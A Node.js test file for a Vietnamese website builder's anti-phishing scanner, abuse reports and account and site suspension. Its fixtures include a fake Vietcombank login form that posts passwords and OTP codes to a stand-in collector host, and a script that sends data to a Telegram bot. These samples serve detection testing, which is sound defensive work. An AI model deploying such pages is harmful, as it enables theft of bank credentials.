'use strict';

const crypto = require('node:crypto');
const test = require('node:test');
const assert = require('node:assert/strict');
const { startServer, client, verifyEmail, getWithHost } = require('./helpers');
const { scanPage, FLAG_THRESHOLD } = require('../src/safety');
const { renderTemplate, listTemplates, listBlocks } = require('../src/templates');

const PHISHING_HTML = `<div class="login"><h1>Xác minh tài khoản</h1><p>Tài khoản của quý khách đã bị tạm khóa. Vui lòng đăng nhập ngân hàng để xác minh.</p>
<form action="https://collector.example.net/save.php" method="post"><input name="username" placeholder="Tên đăng nhập">
<input type="password" name="password" placeholder="Mật khẩu"><input name="otp" placeholder="Nhập mã OTP"><button>Đăng nhập</button></form></div>`;

const form = (body) => ({
  method: 'POST',
  redirect: 'manual',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams(body).toString(),
});

async function signup(base, db, email, name = 'Người dùng') {
  const c = client(base);
  await c('POST', '/api/auth/signup', { name, email, password: 'matkhau123' });
  verifyEmail(db, email);
  const wsId = (await c('GET', '/api/auth/me')).data.workspaces[0].id;
  return { c, wsId };
}

async function createSite(c, wsId, subdomain, template = 'leadgen') {
  const site = (await c('POST', `/api/workspaces/${wsId}/sites`, { name: `Site ${subdomain}`, subdomain, template })).data;
  const page = (await c('GET', `/api/sites/${site.id}/pages`)).data[0];
  return { site, page };
}

async function makePhishing(c, page) {
  await c('PATCH', `/api/pages/${page.id}`, { title: 'Vietcombank - Đăng nhập' });
  await c('PUT', `/api/pages/${page.id}/project`, { project: {}, html: PHISHING_HTML, css: '' });
}

test('heuristics: benign templates and blocks are not flagged', () => {
  for (const { id, name } of listTemplates()) {
    const { html } = renderTemplate(id);
    const result = scanPage({ title: name, html });
    assert.equal(result.flag, false, `${id}: ${result.reasons.join(', ')}`);
    assert.equal(result.autoSuspend, false);
  }
  for (const block of listBlocks()) assert.equal(scanPage({ title: 'Trang', html: block.html }).flag, false, block.id);
  // A member login that mentions an e-wallet for payment stays below the threshold.
  const member = scanPage({ title: 'Khu học viên', html: '<form><input name="email"><input type="password" name="pw"></form><p>Thanh toán qua MoMo</p>' });
  assert.ok(member.score < FLAG_THRESHOLD);
  // "pin" as in battery, "spinner", "opinion" are not PIN fields.
  assert.equal(scanPage({ title: 'Điện thoại', html: '<input name="opinion"><input name="spinner"><p>Pin 5000mAh, OTPhone</p>' }).score, 0);
});

test('heuristics: phishing-like pages are flagged', () => {
  const bank = scanPage({ title: 'Vietcombank - Đăng nhập', html: PHISHING_HTML });
  assert.equal(bank.flag, true);
  assert.equal(bank.autoSuspend, true);
  assert.ok(bank.reasons.some((r) => /mật khẩu/.test(r)));
  assert.ok(bank.reasons.some((r) => /OTP/.test(r)));
  assert.ok(bank.reasons.some((r) => /bên ngoài/.test(r)));
  assert.ok(bank.reasons.some((r) => /vietcombank/i.test(r)));

  // Card harvesting without a bank login: flagged for review, not auto-suspended.
  const card = scanPage({ title: 'Nhận quà tri ân', html: '<form><input name="card_number" placeholder="Số thẻ"><input name="cvv"><input name="exp"></form>' });
  assert.equal(card.flag, true);
  assert.equal(card.autoSuspend, false);

  // Password + bank brand without diacritics, exfiltration to a Telegram bot.
  const tg = scanPage({ title: 'Dang nhap MB Bank', html: '<input type=password name=p><script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script>' });
  assert.equal(tg.flag, true);
  assert.equal(tg.autoSuspend, true);

  // Bank brand alone (e.g. a loan advisor mentioning a bank) is fine.
  assert.equal(scanPage({ title: 'Tư vấn vay mua nhà Techcombank', html: '<form><input name="name"><input name="phone"></form>' }).flag, false);
});

test('abuse report form: render, submit, honeypot, validation, rate limit', async (t) => {
  const { server, base, db, outbox } = await startServer();
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'owner@example.com');
  const { site, page } = await createSite(c, wsId, 'shop');
  await c('POST', `/api/pages/${page.id}/publish`, {});

  await t.test('free-plan branding links to the report form', async () => {
    const html = await (await fetch(`${base}/p/shop`)).text();
    assert.match(html, /Tạo bởi HiTechCloud/);
    assert.match(html, new RegExp(`href="/_htc/report\\?site=${site.id}&amp;page=index"[^>]*>Báo cáo vi phạm`));
  });

  await t.test('GET renders a sandboxed form on any host', async () => {
    const res = await fetch(`${base}/_htc/report?site=${site.id}&page=index`);
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-security-policy'), /sandbox allow-forms/);
    const html = await res.text();
    assert.match(html, /Báo cáo vi phạm/);
    assert.match(html, /name="reason" value="phishing"/);
    assert.match(html, /name="_hp"/);
    assert.match(html, /https:\/\/shop\.sites\.test\//);
    // On a customer host the site is resolved from the hostname (paid plans have no badge).
    const hosted = await getWithHost(base, '/_htc/report', 'shop.sites.test');
    assert.equal(hosted.status, 200);
    assert.match(hosted.text, new RegExp(`name="site" value="${site.id}"`));
    // Unknown host: asks for the URL instead.
    const generic = await (await fetch(`${base}/_htc/report`)).text();
    assert.match(generic, /name="url"/);
    assert.equal((await fetch(`${base}/_htc/report?site=99999`)).status, 404);
  });

  await t.test('POST stores the report and notifies platform admins', async () => {
    const before = outbox.length;
    const res = await fetch(`${base}/_htc/report`, form({ site: site.id, page: 'index', reason: 'phishing', details: 'Giả mạo ngân hàng', email: 'Nguoi@Example.com' }));
    assert.equal(res.status, 200);
    assert.match(await res.text(), /Cảm ơn bạn/);
    const row = db.prepare('SELECT * FROM abuse_reports ORDER BY id DESC').get();
    assert.equal(row.site_id, site.id);
    assert.equal(row.reason, 'phishing');
    assert.equal(row.details, 'Giả mạo ngân hàng');
    assert.equal(row.contact_email, 'nguoi@example.com');
    assert.equal(row.status, 'open');
    assert.ok(outbox.slice(before).some((m) => m.to === 'root@hitechcloud.vn' && /Báo cáo vi phạm mới/.test(m.subject)));
  });

  await t.test('honeypot submissions are silently dropped', async () => {
    const count = db.prepare('SELECT COUNT(*) AS n FROM abuse_reports').get().n;
    const res = await fetch(`${base}/_htc/report`, form({ site: site.id, reason: 'spam', details: 'bot', _hp: 'x' }));
    assert.equal(res.status, 200);
    assert.equal(db.prepare('SELECT COUNT(*) AS n FROM abuse_reports').get().n, count);
  });

  await t.test('validation errors re-render the form', async () => {
    const bad = await fetch(`${base}/_htc/report`, form({ site: site.id, reason: 'bogus' }));
    assert.equal(bad.status, 400);
    assert.match(await bad.text(), /Vui lòng chọn lý do/);
    const noUrl = await fetch(`${base}/_htc/report`, form({ reason: 'spam', url: 'javascript:alert(1)' }));
    assert.equal(noUrl.status, 400);
  });

  await t.test('per-IP rate limit', async () => {
    // 3 counted requests so far; the limit is 5 per hour.
    const ok = await fetch(`${base}/_htc/report`, form({ reason: 'other', url: 'https://example.com/a' }));
    assert.equal(ok.status, 200);
    assert.equal(db.prepare('SELECT url FROM abuse_reports ORDER BY id DESC').get().url, 'https://example.com/a');
    assert.equal((await fetch(`${base}/_htc/report`, form({ reason: 'spam', site: site.id }))).status, 200);
    const limited = await fetch(`${base}/_htc/report`, form({ reason: 'spam', site: site.id }));
    assert.equal(limited.status, 429);
  });
});

test('trust & safety admin endpoints are super-admin only', async (t) => {
  const { server, base, db } = await startServer();
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'owner@example.com');
  const { site, page } = await createSite(c, wsId, 'shop');
  const userId = db.prepare('SELECT id FROM users WHERE email = ?').get('owner@example.com').id;
  const anon = client(base);
  const endpoints = [
    ['GET', '/api/admin/safety/reports'],
    ['GET', '/api/admin/safety/flags'],
    ['GET', '/api/admin/safety/suspended'],
    ['GET', `/api/admin/safety/pages/${page.id}/preview`],
    ['POST', '/api/admin/safety/reports/1/resolve', {}],
    ['POST', '/api/admin/safety/flags/1/dismiss', {}],
    ['POST', `/api/admin/sites/${site.id}/suspend`, { reason: 'x' }],
    ['POST', `/api/admin/sites/${site.id}/unsuspend`, {}],
    ['POST', `/api/admin/users/${userId}/suspend`, { reason: 'x' }],
    ['POST', `/api/admin/users/${userId}/unsuspend`, {}],
  ];
  for (const [method, path, body] of endpoints) {
    assert.equal((await c(method, path, body)).status, 403, `${method} ${path}`);
    assert.equal((await anon(method, path, body)).status, 401, `${method} ${path}`);
  }
  assert.equal(db.prepare('SELECT suspended_at FROM sites WHERE id = ?').get(site.id).suspended_at, null);

  const { c: admin } = await signup(base, db, 'root@hitechcloud.vn', 'Root');
  assert.equal((await admin('GET', '/api/admin/safety/reports')).status, 200);
  assert.equal((await admin('POST', `/api/admin/sites/${site.id}/suspend`, {})).status, 400); // reason required
  const rootId = db.prepare('SELECT id FROM users WHERE email = ?').get('root@hitechcloud.vn').id;
  assert.equal((await admin('POST', `/api/admin/users/${rootId}/suspend`, { reason: 'x' })).status, 400);
  assert.equal((await admin('POST', '/api/admin/sites/99999/suspend', { reason: 'x' })).status, 404);
});

test('suspended sites: 451 on every host, no TLS, no leads, no publishing', async (t) => {
  const { server, base, db, outbox } = await startServer();
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'owner@example.com', 'Chủ');
  db.prepare("UPDATE workspaces SET plan = 'pro' WHERE id = ?").run(wsId);
  const { site, page } = await createSite(c, wsId, 'shop');
  db.prepare("UPDATE sites SET custom_domain = 'shop.example.vn', domain_verified_at = datetime('now') WHERE id = ?").run(site.id);
  assert.equal((await c('POST', `/api/pages/${page.id}/publish`, {})).status, 200);
  await fetch(`${base}/_htc/report`, form({ site: site.id, reason: 'phishing', details: 'Lừa đảo' }));

  assert.equal((await fetch(`${base}/p/shop`)).status, 200);
  assert.equal((await getWithHost(base, '/', 'shop.example.vn')).status, 200);
  assert.equal((await fetch(`${base}/_htc/tls-ask?domain=shop.example.vn`)).status, 200);
  assert.equal((await fetch(`${base}/_htc/tls-ask?domain=shop.sites.test`)).status, 200);

  const { c: admin } = await signup(base, db, 'root@hitechcloud.vn', 'Root');
  const before = outbox.length;
  const res = await admin('POST', `/api/admin/sites/${site.id}/suspend`, { reason: 'Giả mạo ngân hàng' });
  assert.equal(res.status, 200);
  const mail = outbox.slice(before).find((m) => m.to === 'owner@example.com');
  assert.ok(mail, 'owner emailed');
  assert.match(mail.subject, /tạm ngưng/);
  assert.match(mail.text, /Giả mạo ngân hàng/);
  // Pending reports for the site are settled.
  assert.equal(db.prepare("SELECT COUNT(*) AS n FROM abuse_reports WHERE site_id = ? AND status = 'open'").get(site.id).n, 0);

  for (const r of [
    await fetch(`${base}/p/shop`),
    await fetch(`${base}/p/shop/index`),
  ]) {
    assert.equal(r.status, 451);
    assert.match(await r.text(), /Trang đã bị tạm ngưng do vi phạm điều khoản/);
  }
  for (const host of ['shop.sites.test', 'shop.example.vn']) {
    const r = await getWithHost(base, '/', host);
    assert.equal(r.status, 451, host);
    assert.match(r.text, /Trang đã bị tạm ngưng do vi phạm điều khoản/);
    assert.equal((await getWithHost(base, '/sitemap.xml', host)).status, 451);
  }
  assert.equal((await fetch(`${base}/_htc/tls-ask?domain=shop.example.vn`)).status, 404);
  assert.equal((await fetch(`${base}/_htc/tls-ask?domain=shop.sites.test`)).status, 404);

  const lead = await fetch(`${base}/_htc/lead?site=${site.id}&page=index`, form({ name: 'A', phone: '0901' }));
  assert.equal(lead.status, 451);
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM leads').get().n, 0);

  const pub = await c('POST', `/api/pages/${page.id}/publish`, {});
  assert.equal(pub.status, 403);
  assert.match(pub.data.error, /tạm ngưng/);
  const view = (await c('GET', `/api/sites/${site.id}`)).data;
  assert.ok(view.suspended_at);
  assert.equal(view.suspended_reason, 'Giả mạo ngân hàng');

  const listed = (await admin('GET', '/api/admin/safety/suspended')).data;
  assert.deepEqual(listed.sites.map((s) => s.id), [site.id]);

  assert.equal((await admin('POST', `/api/admin/sites/${site.id}/unsuspend`, {})).status, 200);
  assert.ok(outbox.some((m) => m.to === 'owner@example.com' && /khôi phục/.test(m.subject)));
  assert.equal((await fetch(`${base}/p/shop`)).status, 200);
  assert.equal((await fetch(`${base}/_htc/tls-ask?domain=shop.example.vn`)).status, 200);
  assert.equal((await c('POST', `/api/pages/${page.id}/publish`, {})).status, 200);
});

test('suspended users cannot log in and their sessions die', async (t) => {
  const { server, base, db, outbox } = await startServer();
  t.after(() => server.close());
  const { c } = await signup(base, db, 'bad@example.com', 'Bad');
  const { c: admin } = await signup(base, db, 'root@hitechcloud.vn', 'Root');
  const uid = db.prepare('SELECT id FROM users WHERE email = ?').get('bad@example.com').id;
  assert.equal((await c('GET', '/api/auth/me')).status, 200);

  assert.equal((await admin('POST', `/api/admin/users/${uid}/suspend`, { reason: 'Tạo trang lừa đảo' })).status, 200);
  assert.equal((await c('GET', '/api/auth/me')).status, 401);
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM sessions WHERE user_id = ?').get(uid).n, 0);
  const mail = outbox.find((m) => m.to === 'bad@example.com' && /tạm ngưng/.test(m.subject));
  assert.ok(mail);
  assert.match(mail.text, /Tạo trang lừa đảo/);

  const login = await c('POST', '/api/auth/login', { email: 'bad@example.com', password: 'matkhau123' });
  assert.equal(login.status, 403);
  assert.match(login.data.error, /tạm ngưng/);
  // Wrong password still reads as a normal failure.
  assert.equal((await c('POST', '/api/auth/login', { email: 'bad@example.com', password: 'sai-mat-khau' })).status, 401);
  // A session created by another path (e.g. password reset) is rejected too.
  const token = 'phien-cua-tai-khoan-bi-tam-ngung';
  db.prepare("INSERT INTO sessions (token_hash, user_id, expires_at) VALUES (?, ?, '2999-01-01T00:00:00.000Z')")
    .run(crypto.createHash('sha256').update(token).digest('hex'), uid);
  assert.equal((await fetch(`${base}/api/auth/me`, { headers: { Cookie: `htc_session=${token}` } })).status, 401);
  assert.equal((await admin('GET', '/api/admin/safety/suspended')).data.users[0].email, 'bad@example.com');

  assert.equal((await admin('POST', `/api/admin/users/${uid}/unsuspend`, {})).status, 200);
  assert.equal((await c('POST', '/api/auth/login', { email: 'bad@example.com', password: 'matkhau123' })).status, 200);
  assert.equal((await c('GET', '/api/auth/me')).status, 200);
});

test('publishing a phishing-like page flags it and auto-suspends the site', async (t) => {
  const { server, base, db, outbox } = await startServer();
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'owner@example.com');
  const { c: admin } = await signup(base, db, 'root@hitechcloud.vn', 'Root');

  // Benign template page: no flag.
  const benign = await createSite(c, wsId, 'benign');
  const ok = await c('POST', `/api/pages/${benign.page.id}/publish`, {});
  assert.equal(ok.status, 200);
  assert.equal(ok.data.suspended, undefined);
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM safety_flags').get().n, 0);

  db.prepare("UPDATE workspaces SET plan = 'business' WHERE id = ?").run(wsId);
  const { site, page } = await createSite(c, wsId, 'vcb-xacminh', 'blank');
  await makePhishing(c, page);
  const before = outbox.length;
  const pub = await c('POST', `/api/pages/${page.id}/publish`, {});
  assert.equal(pub.status, 200); // publishing itself is allowed
  assert.equal(pub.data.suspended, true);
  assert.equal(pub.data.score, undefined); // scores stay admin-only
  assert.equal((await fetch(`${base}/p/vcb-xacminh`)).status, 451);
  const mails = outbox.slice(before);
  assert.ok(mails.some((m) => m.to === 'owner@example.com' && /tạm ngưng/.test(m.subject)));
  assert.ok(mails.some((m) => m.to === 'root@hitechcloud.vn' && /Tự động tạm ngưng/.test(m.subject)));

  const flags = (await admin('GET', '/api/admin/safety/flags')).data;
  assert.equal(flags.length, 1);
  assert.equal(flags[0].page_id, page.id);
  assert.equal(flags[0].auto_suspended, 1);
  assert.ok(flags[0].score >= 60);
  assert.ok(flags[0].reasons.length >= 3);
  assert.equal(flags[0].owner_email, 'owner@example.com');

  const preview = await admin('GET', `/api/admin/safety/pages/${page.id}/preview`);
  assert.equal(preview.status, 200);
  assert.match(preview.headers.get('content-security-policy'), /^sandbox;/);
  assert.match(preview.data, /Vietcombank/);

  // Dismissing the false positive lifts the automatic suspension.
  const dismissed = await admin('POST', `/api/admin/safety/flags/${flags[0].id}/dismiss`, {});
  assert.equal(dismissed.data.unsuspended, true);
  assert.equal((await fetch(`${base}/p/vcb-xacminh`)).status, 200);
  assert.equal((await admin('GET', '/api/admin/safety/flags')).data.length, 0);
  assert.equal((await admin('GET', '/api/admin/safety/flags?status=dismissed')).data.length, 1);

  // Republishing the same reviewed content does not re-flag or re-suspend.
  const again = await c('POST', `/api/pages/${page.id}/publish`, {});
  assert.equal(again.data.suspended, undefined);
  assert.equal((await fetch(`${base}/p/vcb-xacminh`)).status, 200);
  assert.equal((await admin('GET', '/api/admin/safety/flags')).data.length, 0);

  // Admin can also act from the queue: suspend site marks open flags actioned.
  await c('PUT', `/api/pages/${page.id}/project`, { project: {}, html: `${PHISHING_HTML}<p>v2</p>`, css: '' });
  assert.equal((await c('POST', `/api/pages/${page.id}/publish`, {})).data.suspended, true);
  const open = (await admin('GET', '/api/admin/safety/flags')).data;
  assert.equal(open.length, 1);
  await admin('POST', `/api/admin/sites/${site.id}/suspend`, { reason: 'Đã xác nhận lừa đảo' });
  assert.equal((await admin('GET', '/api/admin/safety/flags?status=actioned')).data.length, 1);
  assert.equal(db.prepare('SELECT suspended_reason FROM sites WHERE id = ?').get(site.id).suspended_reason, 'Đã xác nhận lừa đảo');
});

test('SAFETY_AUTO_SUSPEND=0 only flags for review', async (t) => {
  const { server, base, db } = await startServer({ safetyAutoSuspend: false });
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'owner@example.com');
  const { page } = await createSite(c, wsId, 'vcb', 'blank');
  await makePhishing(c, page);
  const pub = await c('POST', `/api/pages/${page.id}/publish`, {});
  assert.equal(pub.status, 200);
  assert.equal(pub.data.suspended, undefined);
  assert.equal((await fetch(`${base}/p/vcb`)).status, 200);
  const flag = db.prepare('SELECT * FROM safety_flags').get();
  assert.equal(flag.status, 'open');
  assert.equal(flag.auto_suspended, 0);
});

test("suspending an account takes its own sites and API keys offline until it is restored", async (t) => {
  const { server, base, db } = await startServer();
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'bad@example.com', 'Bad');
  const { c: admin } = await signup(base, db, 'root@hitechcloud.vn', 'Root');
  const uid = db.prepare('SELECT id FROM users WHERE email = ?').get('bad@example.com').id;
  db.prepare("UPDATE workspaces SET plan = 'pro' WHERE id = ?").run(wsId);
  const own = await createSite(c, wsId, 'cua-toi');
  const manual = await createSite(c, wsId, 'da-khoa');
  await c('POST', `/api/pages/${own.page.id}/publish`, {});
  const key = (await c('POST', `/api/workspaces/${wsId}/api-keys`, { name: 'Zapier' })).data.key;
  const v1 = () => fetch(`${base}/api/v1/sites`, { headers: { Authorization: `Bearer ${key}` } });
  // A site suspended on its own keeps that suspension when the account is restored.
  await admin('POST', `/api/admin/sites/${manual.site.id}/suspend`, { reason: 'Vi phạm bản quyền' });
  // Someone else's workspace where the account is only an editor stays online.
  const { c: other, wsId: otherWs } = await signup(base, db, 'other@example.com', 'Other');
  const shared = await createSite(other, otherWs, 'cua-nguoi-khac');
  await other('POST', `/api/pages/${shared.page.id}/publish`, {});
  await other('POST', `/api/workspaces/${otherWs}/members`, { email: 'bad@example.com', role: 'editor' });

  assert.equal((await v1()).status, 200);
  assert.equal((await admin('POST', `/api/admin/users/${uid}/suspend`, { reason: 'Lừa đảo' })).status, 200);
  assert.equal((await fetch(`${base}/p/cua-toi`)).status, 451);
  assert.equal((await fetch(`${base}/p/cua-nguoi-khac`)).status, 200);
  const denied = await v1();
  assert.equal(denied.status, 403);
  assert.match((await denied.json()).error, /tạm ngưng/);

  assert.equal((await admin('POST', `/api/admin/users/${uid}/unsuspend`, {})).status, 200);
  assert.equal((await fetch(`${base}/p/cua-toi`)).status, 200);
  assert.equal(db.prepare('SELECT suspended_reason FROM sites WHERE id = ?').get(manual.site.id).suspended_reason, 'Vi phạm bản quyền');
  assert.equal((await v1()).status, 200);
});

test('promoting an A/B variant re-runs the publish scan on the original page', async (t) => {
  const { server, base, db } = await startServer();
  t.after(() => server.close());
  const { c, wsId } = await signup(base, db, 'owner@example.com');
  db.prepare("UPDATE workspaces SET plan = 'business' WHERE id = ?").run(wsId);
  const { site, page } = await createSite(c, wsId, 'thu-nghiem', 'blank');
  await c('POST', `/api/pages/${page.id}/publish`, {});
  const variant = (await c('POST', `/api/sites/${site.id}/pages`, { title: 'B', slug: 'b' })).data;
  // Card-harvesting variant: flagged at its own URL but not auto-suspended.
  await c('PUT', `/api/pages/${variant.id}/project`, { project: {}, html: '<form><input name="card_number" placeholder="Số thẻ"><input name="cvv"></form>', css: '' });
  await c('POST', `/api/pages/${variant.id}/publish`, {});
  const ab = (await c('POST', `/api/sites/${site.id}/ab-tests`, { pageId: page.id, variantPageId: variant.id })).data;
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM safety_flags WHERE page_id = ?').get(page.id).n, 0);
  assert.equal((await c('POST', `/api/ab-tests/${ab.id}/stop`, { winner: 'b' })).status, 200);
  assert.equal(db.prepare("SELECT COUNT(*) AS n FROM safety_flags WHERE page_id = ? AND status = 'open'").get(page.id).n, 1);
});
